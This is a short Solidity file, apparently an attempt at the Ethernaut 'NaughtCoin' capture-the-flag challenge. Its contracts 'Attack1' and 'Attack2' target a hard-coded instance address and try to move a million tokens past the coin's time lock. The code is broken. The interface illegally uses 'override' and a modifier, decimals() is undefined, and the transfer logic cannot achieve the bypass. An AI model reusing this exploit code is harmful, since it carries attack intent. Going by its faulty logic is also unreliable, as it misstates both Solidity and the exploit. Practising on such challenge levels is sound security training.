// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface NaughtCoin{
    function transfer(address _to, uint256 _value) override external lockTokens returns(bool); 
}

contract Attack1{
    address instance = 0x1EBCebC3b97991a2F865E28d0F60884ba1d1D93d;
    NaughtCoin naughtcoin = NaughtCoin(instance);
    function attack1( ) public {
        naughtcoin.transfer(address(this), 1000000 * (10**uint256(decimals())));
    }
}
contract Attack2 is Attack1{
    Attack1 attack = Attack1(address(this));
    function attack2() public{
        attack.attack1();
    }
   
}